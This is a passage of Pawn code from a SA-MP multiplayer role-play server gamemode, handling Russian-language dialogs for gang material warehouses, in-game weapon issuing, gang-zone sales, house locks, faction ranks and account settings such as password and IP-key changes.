			SendMes(playerid, COLOR_LIGHTGREEN, "Вы загрузили {ffffff}%i {9ACD32}материалов. Остаток на складе: {ffffff}%i {9ACD32}материалов",till,Mats[0]);
			materials_Vehicle[GetPlayerVehicleID(playerid)] += till;
			return true;
		}
	case D_JOB+10:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					if(PlayerInfo[playerid][pMats] >= 500) return SendClientMessage(playerid, COLOR_GREY, "У вас в наличии достаточно материалов!");
					return ShowPlayerDialog(playerid, D_JOB+11, 1, "Взять материалы со склада", "Введите кол-во материалов:\nМаксимально: 500 материалов", "Принять", "Отмена");
				}
			case 1:
				{
					if(PlayerInfo[playerid][pMats] == 0) return SendClientMessage(playerid, COLOR_GREY, "У вас в наличии нет материалов!");
					return ShowPlayerDialog(playerid, D_JOB+12, 1, "Положить материалы в общак", "Введите кол-во материалов:", "Принять", "Отмена");
				}
			case 2:
				{
					if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && GetVehicleModel(GetPlayerVehicleID(playerid)) == 482)
					{
						if(GunKG[GetPlayerVehicleID(playerid)] > 0) return SendClientMessage(playerid, COLOR_GREY, "Сначала освободите багажник от оружия!");
						ShowPlayerDialog(playerid, D_JOB+110, 1, "Оружие", "Введите кол-во материалов: от 1 до 2000шт.", "Принять", "Отмена");
					}
					else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в грузовике!");
				}
			case 3:
				{
					if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && GetVehicleModel(GetPlayerVehicleID(playerid)) == 482)
					{
						if(GunKG[GetPlayerVehicleID(playerid)] == 0) return SendClientMessage(playerid, COLOR_GREY, "В грузовике нет материалов!");
						if(PlayerInfo[playerid][pMember] == F_GROVE)
						{
							Mats[5] += GunKG[GetPlayerVehicleID(playerid)];
							SetOtherInt("grovemats", Mats[5]);
							SendMes(playerid, COLOR_LIGHTRED, "Вы выгрузили из грузовика {ffffff}%i {FF6347}материалов. На складе банды: {ffffff}%i {FF6347}материалов",GunKG[GetPlayerVehicleID(playerid)],Mats[5]);
						}
						if(PlayerInfo[playerid][pMember] == F_BALLAS)
						{
							Mats[6] += GunKG[GetPlayerVehicleID(playerid)];
							SetOtherInt("ballasmats", Mats[6]);
							SendMes(playerid, COLOR_LIGHTRED, "Вы выгрузили из грузовика {ffffff}%i {FF6347}материалов. На складе банды: {ffffff}%i {FF6347}материалов",GunKG[GetPlayerVehicleID(playerid)],Mats[6]);
						}
						if(PlayerInfo[playerid][pMember] == F_RIFA)
						{
							Mats[7] += GunKG[GetPlayerVehicleID(playerid)];
							SetOtherInt("rifamats", Mats[7]);
							SendMes(playerid, COLOR_LIGHTRED, "Вы выгрузили из грузовика {ffffff}%i {FF6347}материалов. На складе банды: {ffffff}%i {FF6347}материалов",GunKG[GetPlayerVehicleID(playerid)],Mats[7]);
						}
						if(PlayerInfo[playerid][pMember] == F_AZTECAS)
						{
							Mats[8] += GunKG[GetPlayerVehicleID(playerid)];
							SetOtherInt("aztecasmats", Mats[8]);
							SendMes(playerid, COLOR_LIGHTRED, "Вы выгрузили из грузовика {ffffff}%i {FF6347}материалов. На складе банды: {ffffff}%i {FF6347}материалов",GunKG[GetPlayerVehicleID(playerid)],Mats[8]);
						}
						if(PlayerInfo[playerid][pMember] == F_VAGOS)
						{
							Mats[9] += GunKG[GetPlayerVehicleID(playerid)];
							SetOtherInt("vagosmats", Mats[9]);
							SendMes(playerid, COLOR_LIGHTRED, "Вы выгрузили из грузовика {ffffff}%i {FF6347}материалов. На складе банды: {ffffff}%i {FF6347}материалов",GunKG[GetPlayerVehicleID(playerid)],Mats[9]);
						}
						format(string, 90, "[F] %s привез на склад %i материалов.", PlayerInfo[playerid][pSendername], GunKG[GetPlayerVehicleID(playerid)]);
						SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
						GunKG[GetPlayerVehicleID(playerid)] = 0;
						return true;
					}
					else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в грузовике!");
				}
			case 4:
				{
					if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && GetVehicleModel(GetPlayerVehicleID(playerid)) == 433)
					{
						if(materials_Vehicle[GetPlayerVehicleID(playerid)] == 0) return SendClientMessage(playerid, COLOR_GREY, "В матовозе нет материалов!");
						if(PlayerInfo[playerid][pMember] == F_GROVE)
						{
							Mats[5] += materials_Vehicle[GetPlayerVehicleID(playerid)];
							SetOtherInt("grovemats", Mats[5]);
							SendMes(playerid, COLOR_LIGHTRED, "Вы выгрузили из матовоза {ffffff}%i {FF6347}материалов. На складе банды: {ffffff}%i {FF6347}материалов",materials_Vehicle[GetPlayerVehicleID(playerid)],Mats[5]);
						}
						if(PlayerInfo[playerid][pMember] == F_BALLAS)
						{
							Mats[6] += materials_Vehicle[GetPlayerVehicleID(playerid)];
							SetOtherInt("ballasmats", Mats[6]);
							SendMes(playerid, COLOR_LIGHTRED, "Вы выгрузили из матовоза {ffffff}%i {FF6347}материалов. На складе банды: {ffffff}%i {FF6347}материалов",materials_Vehicle[GetPlayerVehicleID(playerid)],Mats[6]);
						}
						if(PlayerInfo[playerid][pMember] == F_RIFA)
						{
							Mats[7] += materials_Vehicle[GetPlayerVehicleID(playerid)];
							SetOtherInt("rifamats", Mats[7]);
							SendMes(playerid, COLOR_LIGHTRED, "Вы выгрузили из матовоза {ffffff}%i {FF6347}материалов. На складе банды: {ffffff}%i {FF6347}материалов",materials_Vehicle[GetPlayerVehicleID(playerid)],Mats[7]);
						}
						if(PlayerInfo[playerid][pMember] == F_AZTECAS)
						{
							Mats[8] += materials_Vehicle[GetPlayerVehicleID(playerid)];
							SetOtherInt("aztecasmats", Mats[8]);
							SendMes(playerid, COLOR_LIGHTRED, "Вы выгрузили из матовоза {ffffff}%i {FF6347}материалов. На складе банды: {ffffff}%i {FF6347}материалов",materials_Vehicle[GetPlayerVehicleID(playerid)],Mats[8]);
						}
						if(PlayerInfo[playerid][pMember] == F_VAGOS)
						{
							Mats[9] += materials_Vehicle[GetPlayerVehicleID(playerid)];
							SetOtherInt("vagosmats", Mats[9]);
							SendMes(playerid, COLOR_LIGHTRED, "Вы выгрузили из матовоза {ffffff}%i {FF6347}материалов. На складе банды: {ffffff}%i {FF6347}материалов",materials_Vehicle[GetPlayerVehicleID(playerid)],Mats[9]);
						}
						format(string, 90, "[F] %s положил на склад %i материалов.", PlayerInfo[playerid][pSendername], materials_Vehicle[GetPlayerVehicleID(playerid)]);
						SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
						materials_Vehicle[GetPlayerVehicleID(playerid)] = 0;
						return true;
					}
					else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в матовозе!");
				}
			case 5:
				{
					 cmd_getguns(playerid,inputtext);
				}
			}
		}
	case D_JOB+11:
		{
			if(!response) return true;
			new till = 0;
			if(sscanf(inputtext, "i",till)) return ShowPlayerDialog(playerid, D_JOB+11, 1, "материалы", "Введите кол-во материалов:", "Принять", "Отмена");
			if(till < 1 || till > 500)
			{
				SendClientMessage(playerid, COLOR_GREY, "Кол-во материалов от 1 до 500!");
				return ShowPlayerDialog(playerid, D_JOB+11, 1, "материалы", "Введите кол-во материалов:", "Принять", "Отмена");
			}
			new mats;
			if(IsAGang(playerid)) mats = PlayerInfo[playerid][pMember]-3;
			if(IsAMafia(playerid)) mats = PlayerInfo[playerid][pMember];
			if(till > Mats[mats])
			{
				SendClientMessage(playerid, COLOR_GREY, "На складе организации недостаточно материалов!");
				return ShowPlayerDialog(playerid, D_JOB+11, 1, "материалы", "Введите кол-во материалов:", "Принять", "Отмена");
			}
			if(till+PlayerInfo[playerid][pMats] > 500)
			{
				SendClientMessage(playerid, COLOR_GREY, "У вас в наличии достаточно материалов!");
				return ShowPlayerDialog(playerid, D_JOB+11, 1, "материалы", "Введите кол-во материалов:", "Принять", "Отмена");
			}
			PlayerInfo[playerid][pMats] += till;
			Mats[mats] -= till;
			if(PlayerInfo[playerid][pMember] == F_GROVE) SetOtherInt("grovemats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_BALLAS) SetOtherInt("ballasmats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_RIFA) SetOtherInt("rifamats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_AZTECAS) SetOtherInt("aztecasmats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_VAGOS) SetOtherInt("vagosmats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_YAKUZA) SetOtherInt("yakuzamats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_LCN) SetOtherInt("lcnmats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_RM) SetOtherInt("rmmats", Mats[mats]);
			SendMes(playerid, 0x6495EDFF, "Вы взяли со склада %i материалов. В наличии %i материалов", till, PlayerInfo[playerid][pMats]);
			format(string, 90, "[F] %s взял со склада %i материалов. На складе: %i материалов", PlayerInfo[playerid][pSendername], till, Mats[mats]);
			SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
			return true;
		}
	case D_JOB+12:
		{
			if(!response) return true;
			new till = 0;
			if(sscanf(inputtext, "i",till)) return ShowPlayerDialog(playerid, D_JOB+12, 1, "материалы", "Введите кол-во материалов:", "Принять", "Отмена");
			if(till < 1 || till > 500)
			{
				SendClientMessage(playerid, COLOR_GREY, "Кол-во материалов от 1 до 500!");
				return ShowPlayerDialog(playerid, D_JOB+12, 1, "материалы", "Введите кол-во материалов:", "Принять", "Отмена");
			}
			new mats;
			if(IsAGang(playerid)) mats = PlayerInfo[playerid][pMember]-3;
			if(IsAMafia(playerid)) mats = PlayerInfo[playerid][pMember];
			if(till > PlayerInfo[playerid][pMats])
			{
				SendClientMessage(playerid, COLOR_GREY, "Недостаточно материалов в наличии!");
				return ShowPlayerDialog(playerid, D_JOB+12, 1, "материалы", "Введите кол-во материалов:", "Принять", "Отмена");
			}
			if(till+Mats[mats] > 1000)
			{
				SendClientMessage(playerid, COLOR_GREY, "На складе банды недостаточно места!");
				return ShowPlayerDialog(playerid, D_JOB+12, 1, "материалы", "Введите кол-во материалов:", "Принять", "Отмена");
			}
			PlayerInfo[playerid][pMats] -= till;
			Mats[mats] += till;
			if(PlayerInfo[playerid][pMember] == F_GROVE) SetOtherInt("grovemats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_BALLAS) SetOtherInt("ballasmats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_RIFA) SetOtherInt("rifamats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_AZTECAS) SetOtherInt("aztecasmats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_VAGOS) SetOtherInt("vagosmats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_YAKUZA) SetOtherInt("yakuzamats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_LCN) SetOtherInt("lcnmats", Mats[mats]);
			if(PlayerInfo[playerid][pMember] == F_RM) SetOtherInt("rmmats", Mats[mats]);
			SendMes(playerid, 0x6495EDFF, "Вы положили на склад %i материалов. В наличии %i материалов", till, PlayerInfo[playerid][pMats]);
			format(string, 90, "[F] %s положил на склад %i материалов. На складе: %i материалов", PlayerInfo[playerid][pSendername], till, Mats[mats]);
			SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
			return true;
		}
		case D_JOB+112:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
				        new mats;
				        if(IsAGang(playerid)) mats = PlayerInfo[playerid][pMember]-3;
						if(200 > Mats[mats])
			            {
				        SendClientMessage(playerid, COLOR_GREY, "• Недостаточно материалов на складе!");
				        return ShowPlayerDialog(playerid, D_JOB+112, 2, "Оружие", "• Desert Eagle [150 патронов]\n• M4A1 [200 патронов]\n• AK47 [200 патронов]\n• Shotgun [50 патронов]", "Принять", "Отмена");
			            }
						if(PlayerInfo[playerid][pMember] == F_GROVE)
						{
							Mats[5] -= 200;
							SetOtherInt("grovemats", Mats[5]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада Desert Eagle с 150 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[5]);
							GiveWeapon(playerid, 24, 150);
						}
						if(PlayerInfo[playerid][pMember] == F_BALLAS)
						{
							Mats[6] -= 200;
							SetOtherInt("ballasmats", Mats[6]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада Desert Eagle с 150 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[6]);
							GiveWeapon(playerid, 24, 150);
						}
						if(PlayerInfo[playerid][pMember] == F_RIFA)
						{
							Mats[7] -= 200;
							SetOtherInt("rifamats", Mats[7]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада Desert Eagle с 150 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[7]);
							GiveWeapon(playerid, 24, 150);
						}
						if(PlayerInfo[playerid][pMember] == F_AZTECAS)
						{
							Mats[8] -= 200;
							SetOtherInt("aztecasmats", Mats[8]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада Desert Eagle с 150 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[8]);
							GiveWeapon(playerid, 24, 150);
						}
						if(PlayerInfo[playerid][pMember] == F_VAGOS)
						{
							Mats[9] -= 200;
							SetOtherInt("vagosmats", Mats[9]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада Desert Eagle с 150 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[9]);
							GiveWeapon(playerid, 24, 150);
						}
						format(string, 90, "[F] %s взял со склада Desert Eagle.", PlayerInfo[playerid][pSendername]);
						SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
						return true;
				}
			case 1:
			{
				        new mats;
				        if(IsAGang(playerid)) mats = PlayerInfo[playerid][pMember]-3;
						if(350 > Mats[mats])
			            {
				        SendClientMessage(playerid, COLOR_GREY, "• Недостаточно материалов на складе!");
				        return ShowPlayerDialog(playerid, D_JOB+112, 2, "Оружие", "• Desert Eagle [150 патронов]\n• M4A1 [200 патронов]\n• AK47 [200 патронов]\n• Shotgun [50 патронов]", "Принять", "Отмена");
			            }
						if(PlayerInfo[playerid][pMember] == F_GROVE)
						{
							Mats[5] -= 350;
							SetOtherInt("grovemats", Mats[5]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада M4A1 с 200 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[5]);
							GiveWeapon(playerid, 31, 200);
						}
						if(PlayerInfo[playerid][pMember] == F_BALLAS)
						{
							Mats[6] -= 350;
							SetOtherInt("ballasmats", Mats[6]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада M4A1 с 200 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[6]);
							GiveWeapon(playerid, 31, 200);
						}
						if(PlayerInfo[playerid][pMember] == F_RIFA)
						{
							Mats[7] -= 350;
							SetOtherInt("rifamats", Mats[7]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада M4A1 с 200 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[7]);
							GiveWeapon(playerid, 31, 200);
						}
						if(PlayerInfo[playerid][pMember] == F_AZTECAS)
						{
							Mats[8] -= 350;
							SetOtherInt("aztecasmats", Mats[8]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада M4A1 с 200 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[8]);
							GiveWeapon(playerid, 31, 200);
						}
						if(PlayerInfo[playerid][pMember] == F_VAGOS)
						{
							Mats[9] -= 350;
							SetOtherInt("vagosmats", Mats[9]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада M4A1 с 200 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[9]);
							GiveWeapon(playerid, 31, 200);
						}
						format(string, 90, "[F] %s взял со склада M4A1.", PlayerInfo[playerid][pSendername]);
						SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
						return true;
				}
			case 2:
			{
				        new mats;
				        if(IsAGang(playerid)) mats = PlayerInfo[playerid][pMember]-3;
						if(350 > Mats[mats])
			            {
				        SendClientMessage(playerid, COLOR_GREY, "• Недостаточно материалов на складе!");
				        return ShowPlayerDialog(playerid, D_JOB+112, 2, "Оружие", "• Desert Eagle [150 патронов]\n• M4A1 [200 патронов]\n• AK47 [200 патронов]\n• Shotgun [50 патронов]", "Принять", "Отмена");
			            }
						if(PlayerInfo[playerid][pMember] == F_GROVE)
						{
							Mats[5] -= 350;
							SetOtherInt("grovemats", Mats[5]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада AK47 с 200 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[5]);
							GiveWeapon(playerid, 30, 200);
						}
						if(PlayerInfo[playerid][pMember] == F_BALLAS)
						{
							Mats[6] -= 350;
							SetOtherInt("ballasmats", Mats[6]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада AK47 с 200 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[6]);
							GiveWeapon(playerid, 30, 200);
						}
						if(PlayerInfo[playerid][pMember] == F_RIFA)
						{
							Mats[7] -= 350;
							SetOtherInt("rifamats", Mats[7]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада AK47 с 200 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[7]);
							GiveWeapon(playerid, 30, 200);
						}
						if(PlayerInfo[playerid][pMember] == F_AZTECAS)
						{
							Mats[8] -= 350;
							SetOtherInt("aztecasmats", Mats[8]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада AK47 с 200 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[8]);
							GiveWeapon(playerid, 30, 200);
						}
						if(PlayerInfo[playerid][pMember] == F_VAGOS)
						{
							Mats[9] -= 350;
							SetOtherInt("vagosmats", Mats[9]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада AK47 с 200 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[9]);
							GiveWeapon(playerid, 30, 200);
						}
						format(string, 90, "[F] %s взял со склада AK47.", PlayerInfo[playerid][pSendername]);
						SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
						return true;
				}
			case 3:
			{
				        new mats;
				        if(IsAGang(playerid)) mats = PlayerInfo[playerid][pMember]-3;
						if(150 > Mats[mats])
			            {
				        SendClientMessage(playerid, COLOR_GREY, "• Недостаточно материалов на складе!");
				        return ShowPlayerDialog(playerid, D_JOB+112, 2, "Оружие", "• Desert Eagle [150 патронов]\n• M4A1 [200 патронов]\n• AK47 [200 патронов]\n• Shotgun [50 патронов]", "Принять", "Отмена");
			            }
						if(PlayerInfo[playerid][pMember] == F_GROVE)
						{
							Mats[5] -= 150;
							SetOtherInt("grovemats", Mats[5]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада Shotgun с 50 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[5]);
							GiveWeapon(playerid, 25, 50);
						}
						if(PlayerInfo[playerid][pMember] == F_BALLAS)
						{
							Mats[6] -= 150;
							SetOtherInt("ballasmats", Mats[6]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада Shotgun с 50 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[6]);
							GiveWeapon(playerid, 25, 50);
						}
						if(PlayerInfo[playerid][pMember] == F_RIFA)
						{
							Mats[7] -= 150;
							SetOtherInt("rifamats", Mats[7]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада Shotgun с 50 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[7]);
							GiveWeapon(playerid, 25, 50);
						}
						if(PlayerInfo[playerid][pMember] == F_AZTECAS)
						{
							Mats[8] -= 150;
							SetOtherInt("aztecasmats", Mats[8]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада Shotgun с 50 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[8]);
							GiveWeapon(playerid, 25, 50);
						}
						if(PlayerInfo[playerid][pMember] == F_VAGOS)
						{
							Mats[9] -= 150;
							SetOtherInt("vagosmats", Mats[9]);
							SendMes(playerid, COLOR_LIGHTRED, "• Вы взяли со склада Shotgun с 50 патронами. На складе банды: {ffffff}%i {FF6347}материалов",Mats[9]);
							GiveWeapon(playerid, 25, 50);
						}
						format(string, 90, "[F] %s взял со склада Shotgun.", PlayerInfo[playerid][pSendername]);
						SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
						return true;
				}
			}
		}
	case D_JOB+13:
		{
			new playerd = GetPVarInt(playerid, "PlayerZone"), price = GetPVarInt(playerid, "ZonePrice"), i = GetPVarInt(playerid, "ZoneID");
			if(response)
			{
				if(GetMoney(playerid) < price)
				{
					SendMes(playerd,0x6495EDFF, "У игрока %s недостаточно средств", PlayerInfo[playerid][pSendername]);
					DeletePVar(playerid, "PlayerZone");
					DeletePVar(playerid, "ZonePrice");
					DeletePVar(playerid, "ZoneID");
					return SendClientMessage(playerid, COLOR_GREY, "Недостаточно средств");
				}
				GZInfo[i][gFrak] = PlayerInfo[playerid][pMember];
				GangZoneStopFlashForAll(GZInfo[i][id]);
				GangZoneHideForAll(GZInfo[i][id]);
				GangZoneShowForAll(GZInfo[i][id],GetGangZoneColor(i));
				SaveGZ(i);
				GiveMoney(playerid, -price);
				GiveMoney(playerd, price);
				SendMes(playerd, COLOR_BLUE, "Вы продали зону %s'у за %i долларов", PlayerInfo[playerid][pSendername], price);
				SendMes(playerid, COLOR_BLUE, "Вы купили зону у %s. Цена: %i", sendername(playerd), price);
				format(string, 100, "[F] %s продает зону банде %s (%s)",sendername(playerd), FracInfo[PlayerInfo[playerid][pMember]][fName], PlayerInfo[playerid][pSendername]);
				SendFMes(PlayerInfo[playerd][pMember], COLOR_LIGHTRED, string);
				format(string, 100, "[F] %s покупает зону у банды %s (%s)",PlayerInfo[playerid][pSendername], FracInfo[PlayerInfo[playerd][pMember]][fName], sendername(playerd));
				SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
			}
			else SendMes(playerd, COLOR_BLUE, "%s отклонил предложение купить зону за %i долларов", PlayerInfo[playerid][pSendername], price);
			DeletePVar(playerid, "PlayerZone");
			DeletePVar(playerid, "ZonePrice");
			DeletePVar(playerid, "ZoneID");
			return true;
		}
	case D_JOB+14:
		{
			if(!response) return true;
			new i = GetPVarInt(playerid, "PlayerHouse");
			HouseInfo[i][hLock] = 0;
			format(string, 16, "~g~unlock");
			PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
			GameTextForPlayer(playerid, string, 5000, 5);
			format(string, 90, "%s открывает замок дома", PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,20.0,COLOR_PURPLE,string);
			SetHouseInt(i, "hLock", HouseInfo[i][hLock]);
			return true;
		}
	case D_JOB+15:
		{
			new playerd = GetPVarInt(playerid, "PlayerRank");
			if(!response) { DeletePVar(playerid, "PlayerRank"); return true; }
			if(!IsPlayerConnected(playerd)) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
			if(PlayerLogged[playerd] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
			if(PlayerInfo[playerd][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
			if(PlayerInfo[playerd][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
			DeletePVar(playerid, "PlayerRank");
			PlayerInfo[playerd][pRank] = listitem+1;
			SendMes(playerd,COLOR_BLUE,"%s %s повысил/понизил ваш ранг. Сейчас вы: %s",FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],FracRank[PlayerInfo[playerd][pMember]][PlayerInfo[playerd][pRank]]);
			SendMes(playerid,COLOR_BLUE,"Вы повысили/понизили ранг %s. Сейчас он/она: %s",sendername(playerd), FracRank[PlayerInfo[playerd][pMember]][PlayerInfo[playerd][pRank]]);
		}
	case D_JOB+16:
		{
			new playerd = GetPVarInt(playerid, "PlayerInvite");
			new member = GetPVarInt(playerid, "PlayerInviteAdmin");
			if(response)
			{
				PlayerInfo[playerid][pMember] = member;
				SendMes(playerd,COLOR_BLUE,"%s принял предложение присоединиться к \"%s\"",PlayerInfo[playerid][pSendername], FracInfo[member][fName]);
				SendMes(playerid,COLOR_BLUE,"Вы присоединились к организации \"%s\"",FracInfo[member][fName]);
				PlayerInfo[playerid][pRank] = 1;
				PlayerInfo[playerid][pJob] = 0;
				SelectCharID[playerid] = PlayerInfo[playerid][pMember];
				SelectCharPlace[playerid] = 1;
				ClothesRound[playerid] = 2;
				SpawnPlayer(playerid);
				return true;
			}
			else SendMes(playerd,COLOR_BLUE,"%s отклонил предложение присоединиться к \"%s\"",PlayerInfo[playerid][pSendername], FracInfo[member][fName]);
			DeletePVar(playerid, "PlayerInvite");
			DeletePVar(playerid, "PlayerInviteAdmin");
		}
	case D_JOB+17:
		{
			if(!response) return cmd_mm(playerid, inputtext);
			switch(listitem)
			{
			case 0:
				{
					if(SendFamily[playerid] == 1)
					{
						SendClientMessage(playerid, COLOR_LIGHTRED, "Вы отключили семейный чат");
						SendFamily[playerid] = 0;
					}
					else
					{
						SendClientMessage(playerid, COLOR_LIGHTGREEN, "Вы включили семейный чат");
						SendFamily[playerid] = 1;
					}
				}
			case 1:
				{
					if(PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
					if(SendAdmin[playerid] == 1)
					{
						SendClientMessage(playerid, COLOR_LIGHTRED, "Вы отключили администраторский чат");
						SendAdmin[playerid] = 0;
					}
					else
					{
						SendClientMessage(playerid, COLOR_LIGHTGREEN, "Вы включили администраторский чат");
						SendAdmin[playerid] = 1;
					}
				}
			case 2:
				{
					new a;
					while(a++ < 100) SendClientMessage(playerid, COLOR_LIGHTRED, "");
					SendClientMessage(playerid, COLOR_LIGHTRED, "Вы очистили чат");
				}
			case 3:
				{
					if(PlayerInfo[playerid][pSex] == 1)
					{
						PlayerInfo[playerid][pSex] = 2;
						SendClientMessage(playerid, COLOR_LIGHTRED, "Вы сменили пол на: женский");
					}
					else
					{
						SendClientMessage(playerid, COLOR_LIGHTRED, "Вы сменили пол на: мужской");
						PlayerInfo[playerid][pSex] = 1;
					}
				}
			case 4: ShowPlayerDialog(playerid, D_JOB+20, 1, "Смена ника", "Введите будущий ник\n\nВнимание! Мы меняем только Non-RP ники", "Принять", "Отмена");
			case 5: ShowPlayerDialog(playerid, D_JOB+18, 1, "Смена пароля", "Введите ваш действующий пароль:", "Принять", "Отмена");
			case 6:
				{
					if(!strcmp(PlayerInfo[playerid][pIpPassword], "qwerty",true))
					{
						SendClientMessage(playerid, COLOR_LIGHTRED, "Внимание! Сменить ключ IP можно только 1 раз!");
						ShowPlayerDialog(playerid, 12422, DIALOG_STYLE_INPUT, "Смена ключа IP", "Введите будущий ключ IP авторизации", "Принять", "Отмена");
					}
					else
					{
						switch(PlayerInfo[playerid][ProverkaIP])
						{
						case 0:
							{
								PlayerInfo[playerid][ProverkaIP] = 1;
								SendClientMessage(playerid,-1,"Проверка по IP успешно включена");
							}
						case 1:
							{
								PlayerInfo[playerid][ProverkaIP] = 0;
								SendClientMessage(playerid,-1,"Проверка по IP успешно отключена");
							}
						}
						format(totalstring, 512, "Чат семьи\t\t\t%s\nЧат администратора\t\t%s\nОчистить чат\nСмена пола\nСмена имени\nСмена пароля\nПроверка по IP \t\t%s",(!SendFamily[playerid]) ? ("{9ACD32}Включить") : ("{FF6347}Выключить"),(!SendAdmin[playerid]) ? ("{9ACD32}Включить") : ("{FF6347}Выключить"),(!PlayerInfo[playerid][ProverkaIP]) ? ("{FF6347}Отключена") : ("{9ACD32}Включена"));
						ShowPlayerDialog(playerid, D_JOB+17, 2, "Настройки", totalstring, "Принять", "Отмена");
					}
				}

			}
		}
	case 12422:
		{
			if(!response) return true;
			new password[32];
			if(sscanf(inputtext, "s[32]",password)) return ShowPlayerDialog(playerid, D_JOB+19, 1, "Смена пароля", "Введите новый пароль:", "Принять", "Отмена");
			if(strlen(password) < 3 || strlen(password) > 16)
			{
				SendClientMessage(playerid, COLOR_GREY, "Кол-во символов от 3 до 16!");
				return ShowPlayerDialog(playerid, 12422, DIALOG_STYLE_INPUT, "Смена ключа IP", "Введите будущий ключ IP авторизации", "Принять", "Отмена");
			}
			if(IsTextRussian(password))
			{
				SendClientMessage(playerid, COLOR_GREY, "Использовать русские символы запрещено!");
				return ShowPlayerDialog(playerid, 12422, DIALOG_STYLE_INPUT, "Смена ключа IP", "Введите будущий ключ IP авторизации", "Принять", "Отмена");
			}
			strmid(PlayerInfo[playerid][pIpPassword], password, 0, strlen(password), 32);
			SendMes(playerid, COLOR_LIGHTRED, "Ваш новый IP пароль: {ffffff}'%s' (без кавычек)", inputtext);
			SendClientMessage(playerid, COLOR_LIGHTRED, "Рекомендуается сделать скриншот. Клавиша: {ffffff}F8");
			SetPlayerStr(PlayerInfo[playerid][pSendername],"ippassword",PlayerInfo[playerid][pIpPassword]);
		}
	case D_JOB+18:
		{
			if(!response) return true;
			new password[32];
			if(sscanf(inputtext, "s[32]",password)) return ShowPlayerDialog(playerid, D_JOB+18, 1, "Смена пароля", "Введите ваш действующий пароль:", "Принять", "Отмена");
			if(strlen(password) < 3 || strlen(password) > 16)
			{
				SendClientMessage(playerid, COLOR_GREY, "Кол-во символов от 3 до 16!");
